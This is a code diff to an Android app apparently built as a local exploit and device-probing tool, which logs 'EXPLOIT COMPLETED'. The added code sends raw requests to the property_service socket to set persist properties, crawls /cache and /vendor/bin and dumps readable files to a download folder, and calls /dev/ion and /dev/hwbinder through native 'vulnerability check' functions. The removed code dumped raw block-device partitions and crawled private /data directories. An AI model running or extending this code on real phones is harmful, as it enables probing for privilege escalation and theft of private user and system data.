@@ -80,6 +80,8 @@ public class MainActivity extends AppCompatActivity {
     public static native String nativeReadLink(String path);
     public static native String nativeTestFd(int fd);
     public static native int nativeOpenDevice(String path);
+    public static native String nativeIonTest(int fd);
+    public static native String nativeHwbinderTest(int fd);
 
     private ServiceConnection tzConnection = new ServiceConnection() {
         @Override
@@ -207,7 +209,7 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // 2. property_service deep test (AOSP 9 protocol)
+        // 2. property_service deep test with per-test socket reopen
         appendLog("[*] Deep property service testing (AOSP 9 protocol)");
         testPropertyServiceDeep();
 
@@ -227,30 +229,13 @@ public class MainActivity extends AppCompatActivity {
         appendLog("[*] Bruteforcing /sys for readable files");
         bruteforceSys();
 
-        // 7. Bruteforce /dev/block (all partitions)
-        appendLog("[*] Bruteforcing /dev/block for readable partitions (30MB dump)");
-        bruteforceBlock();
+        // 7. Bruteforce /cache and /vendor/bin for copyable files
+        appendLog("[*] Bruteforcing /cache and /vendor/bin for copyable files");
+        bruteforceCacheAndVendor();
 
-        // 8. Bruteforce /data for copyable files (depth limited)
-        appendLog("[*] Bruteforcing /data for copyable files (depth limited)");
-        bruteforceData();
-
-        // 9. Direct device open test (ion, hwbinder)
-        appendLog("[*] Testing direct open of /dev/ion");
-        int ionFd = nativeOpenDevice("/dev/ion");
-        appendLog("[DEV] /dev/ion open returned fd=" + ionFd);
-        if (ionFd >= 0) {
-            String info = nativeTestFd(ionFd);
-            appendLog("[DEV] /dev/ion fd info: " + info);
-        }
-
-        appendLog("[*] Testing direct open of /dev/hwbinder");
-        int hwbinderFd = nativeOpenDevice("/dev/hwbinder");
-        appendLog("[DEV] /dev/hwbinder open returned fd=" + hwbinderFd);
-        if (hwbinderFd >= 0) {
-            String info = nativeTestFd(hwbinderFd);
-            appendLog("[DEV] /dev/hwbinder fd info: " + info);
-        }
+        // 8. Direct device open test (ion, hwbinder) with CVE/POC references
+        appendLog("[*] Testing direct open of /dev/ion and hwbinder with vulnerability checks");
+        testIonAndHwbinder();
 
         appendLog("========== EXPLOIT COMPLETED ==========");
         appendLog("========================================");
@@ -261,7 +246,7 @@ public class MainActivity extends AppCompatActivity {
         finishTest();
     }
 
-    // ===== Socket test =====
+    // ===== Socket test (unchanged) =====
     private void testSocket(String path) {
         ParcelFileDescriptor pfd = null;
         try {
@@ -463,45 +448,54 @@ public class MainActivity extends AppCompatActivity {
         return baos.toByteArray();
     }
 
-    // ===== Property Service (AOSP 9) =====
+    // ===== Property Service (AOSP 9) with per-test socket reopen =====
     private void testPropertyServiceDeep() {
+        // Known writable persist properties
+        String[][] testCases = {
+                {"persist.sys.timezone", "Asia/Tokyo"},
+                {"persist.sys.language", "ja"},
+                {"persist.sys.country", "JP"},
+                {"persist.sys.locale", "ja-JP"},
+                {"persist.test.poc", "1"},
+                {"persist.test.poc", "2"}
+        };
+
+        for (String[] test : testCases) {
+            if (stopRequested.get()) break;
+            String name = test[0];
+            String value = test[1];
+            appendLog("[PROP] Trying " + name + "=" + value);
+            int result = tryPropertySet(name, value);
+            appendLog("[PROP] Result: " + result + " (" + getPropertyErrorString(result) + ")");
+            if (result == PROP_SUCCESS) {
+                appendLog("[PROP] SUCCESS! Property " + name + " set to " + value);
+                // Try to read back via system property? We'll just note success.
+            }
+            try { Thread.sleep(100); } catch (Exception ignored) {}
+        }
+    }
+
+    private int tryPropertySet(String name, String value) {
         ParcelFileDescriptor pfd = null;
         try {
             int[] handle = new int[1];
             pfd = openSocket("/dev/socket/property_service", handle);
             if (pfd == null) {
-                appendLog("[PROP] Failed to open property_service for deep test");
-                return;
+                appendLog("[PROP] Failed to open property_service for " + name);
+                return -3;
             }
             FileDescriptor fd = pfd.getFileDescriptor();
             if (fd == null || !fd.valid()) {
-                appendLog("[PROP] Invalid FD");
-                pfd.close();
-                return;
+                appendLog("[PROP] Invalid FD for " + name);
+                return -4;
             }
-
-            String[][] tests = {
-                    {"persist.test.poc", "1"},
-                    {"persist.test.poc", "2"},
-                    {"test.prop", "value"},
-                    {"persist.test.long", "a".repeat(150)} // > 92 chars should fail
-            };
-
-            for (String[] test : tests) {
-                if (stopRequested.get()) break;
-                String name = test[0];
-                String value = test[1];
-                int result = sendPropertySet2(fd, name, value);
-                appendLog("[PROP] Set " + name + "=" + value + " => result: " + result + " (" + getPropertyErrorString(result) + ")");
-            }
-
-            int oldResult = sendPropertySet1(fd, "persist.test.old", "1");
-            appendLog("[PROP] Old format set persist.test.old=1 => result: " + oldResult);
-
+            int result = sendPropertySet2(fd, name, value);
             pfd.close();
+            return result;
         } catch (Exception e) {
-            appendLog("[PROP] Deep test error: " + e.getMessage());
+            appendLog("[PROP] Exception: " + e.getMessage());
             if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
+            return -2;
         }
     }
 
@@ -529,36 +523,6 @@ public class MainActivity extends AppCompatActivity {
             }
             return -1;
         } catch (Exception e) {
-            appendLog("[PROP] sendPropertySet2 exception: " + e.getMessage());
-            return -2;
-        }
-    }
-
-    private int sendPropertySet1(FileDescriptor fd, String name, String value) {
-        try {
-            ByteBuffer buf = ByteBuffer.allocate(4 + 32 + 92);
-            buf.order(ByteOrder.LITTLE_ENDIAN);
-            buf.putInt(1);
-            byte[] nameBytes = name.getBytes(StandardCharsets.UTF_8);
-            byte[] valueBytes = value.getBytes(StandardCharsets.UTF_8);
-            buf.put(nameBytes);
-            for (int i = nameBytes.length; i < 32; i++) buf.put((byte)0);
-            buf.put(valueBytes);
-            for (int i = valueBytes.length; i < 92; i++) buf.put((byte)0);
-            byte[] data = buf.array();
-            OutputStream os = new FileOutputStream(fd);
-            os.write(data);
-            os.flush();
-            os.close();
-
-            InputStream is = new FileInputStream(fd);
-            byte[] resp = new byte[4];
-            int read = readBytes(is, resp, 4, 500);
-            is.close();
-            if (read == 4) return ByteBuffer.wrap(resp).order(ByteOrder.LITTLE_ENDIAN).getInt();
-            return 0;
-        } catch (Exception e) {
-            appendLog("[PROP] sendPropertySet1 exception: " + e.getMessage());
             return -2;
         }
     }
@@ -690,7 +654,6 @@ public class MainActivity extends AppCompatActivity {
         for (String p : paths) {
             if (stopRequested.get()) break;
             File f = new File(p);
-            String result;
             if (f.isDirectory()) {
                 String[] children = nativeListDir(p);
                 if (children != null) {
@@ -758,88 +721,35 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    // ===== Bruteforce /dev/block (all partitions) =====
-    private void bruteforceBlock() {
+    // ===== Bruteforce /cache and /vendor/bin =====
+    private void bruteforceCacheAndVendor() {
         File dumpDir = getDumpDir();
         if (dumpDir == null) return;
 
-        // Explicit loops for each device pattern
-        for (int i = 1; i <= 30; i++) {
-            String path = "/dev/block/mmcblk0p" + i;
-            tryDumpBlock(path, dumpDir);
-        }
-        for (int i = 1; i <= 16; i++) {
-            String path = "/dev/block/mmcblk1p" + i;
-            tryDumpBlock(path, dumpDir);
-        }
-        for (int i = 1; i <= 16; i++) {
-            String path = "/dev/block/sda" + i;
-            tryDumpBlock(path, dumpDir);
-            path = "/dev/block/sdb" + i;
-            tryDumpBlock(path, dumpDir);
-        }
-        for (int i = 0; i <= 15; i++) {
-            String path = "/dev/block/dm-" + i;
-            tryDumpBlock(path, dumpDir);
-            path = "/dev/block/loop" + i;
-            tryDumpBlock(path, dumpDir);
-        }
-        // Also try /dev/block/by-name/* symlinks
-        File byName = new File("/dev/block/by-name/");
-        if (byName.exists() && byName.isDirectory()) {
-            String[] links = byName.list();
-            if (links != null) {
-                for (String link : links) {
-                    if (stopRequested.get()) break;
-                    String path = "/dev/block/by-name/" + link;
-                    String target = nativeReadLink(path);
-                    if (target != null) {
-                        String realPath = "/dev/block/" + target;
-                        tryDumpBlock(realPath, dumpDir);
-                    }
-                }
-            }
-        }
-    }
-
-    private void tryDumpBlock(String path, File dumpDir) {
-        if (stopRequested.get()) return;
-        File f = new File(path);
-        if (f.exists() && f.canRead()) {
-            appendLog("[BLK] Found " + path + ", size=" + f.length());
-            String fileName = new File(path).getName() + ".bin";
-            File out = new File(dumpDir, fileName);
-            if (dumpFileToDownload(path, out, 30 * 1024 * 1024)) {
-                appendLog("[BLK] Dumped first 30MB of " + path + " to " + out.getAbsolutePath());
-            } else {
-                appendLog("[BLK] Failed to dump " + path);
-            }
-        }
-    }
-
-    // ===== Bruteforce /data (enhanced) =====
-    private void bruteforceData() {
-        String[] bases = {
-                "/data/local/tmp/",
-                "/data/data/",
-                "/data/misc/",
-                "/data/system/",
-                "/data/apex/",
-                "/data/vendor/",
-                "/data/user/0/"
-        };
-        for (String base : bases) {
+        String[] roots = {"/cache", "/vendor/bin"};
+        for (String root : roots) {
             if (stopRequested.get()) break;
-            File dir = new File(base);
-            if (!dir.exists()) continue;
-            List<File> files = listFilesRecursive(dir, 0, 3); // depth 3 to avoid excessive recursion
+            File dir = new File(root);
+            if (!dir.exists()) {
+                appendLog("[BRUTE] " + root + " does not exist");
+                continue;
+            }
+            List<File> files = listFilesRecursive(dir, 0, 3);
             for (File f : files) {
                 if (stopRequested.get()) break;
                 if (f.isFile() && f.canRead()) {
                     try {
                         String content = nativeReadFile(f.getAbsolutePath());
                         if (content != null && !content.isEmpty()) {
-                            appendLog("[DATA] " + f.getAbsolutePath() + " = " + content.substring(0, Math.min(100, content.length())));
+                            appendLog("[BRUTE] " + f.getAbsolutePath() + " = " + content.substring(0, Math.min(100, content.length())));
+                        }
+                        // Dump the file if it's not too large
+                        if (f.length() < 10 * 1024 * 1024) {
+                            String fileName = "brute_" + f.getName().replace('/', '_') + ".bin";
+                            File out = new File(dumpDir, fileName);
+                            if (dumpFileToDownload(f.getAbsolutePath(), out, 30 * 1024 * 1024)) {
+                                appendLog("[BRUTE] Dumped " + f.getAbsolutePath() + " to " + out.getAbsolutePath());
+                            }
                         }
                     } catch (Exception e) {
                         // ignore
@@ -866,6 +776,31 @@ public class MainActivity extends AppCompatActivity {
             } catch (Exception ignored) {}
         }
         return result;
+    }
+
+    // ===== Ion and Hwbinder vulnerability checks =====
+    private void testIonAndHwbinder() {
+        // Open /dev/ion
+        int ionFd = nativeOpenDevice("/dev/ion");
+        appendLog("[DEV] /dev/ion open returned fd=" + ionFd);
+        if (ionFd >= 0) {
+            String info = nativeTestFd(ionFd);
+            appendLog("[DEV] /dev/ion fd info: " + info);
+            // Test ion allocation (ioctl)
+            String ionResult = nativeIonTest(ionFd);
+            appendLog("[DEV] ion test result: " + ionResult);
+        }
+
+        // Open /dev/hwbinder
+        int hwbinderFd = nativeOpenDevice("/dev/hwbinder");
+        appendLog("[DEV] /dev/hwbinder open returned fd=" + hwbinderFd);
+        if (hwbinderFd >= 0) {
+            String info = nativeTestFd(hwbinderFd);
+            appendLog("[DEV] /dev/hwbinder fd info: " + info);
+            // Test hwbinder transaction (simple ioctl)
+            String hwbinderResult = nativeHwbinderTest(hwbinderFd);
+            appendLog("[DEV] hwbinder test result: " + hwbinderResult);
+        }
     }
 
     // ===== Utils =====
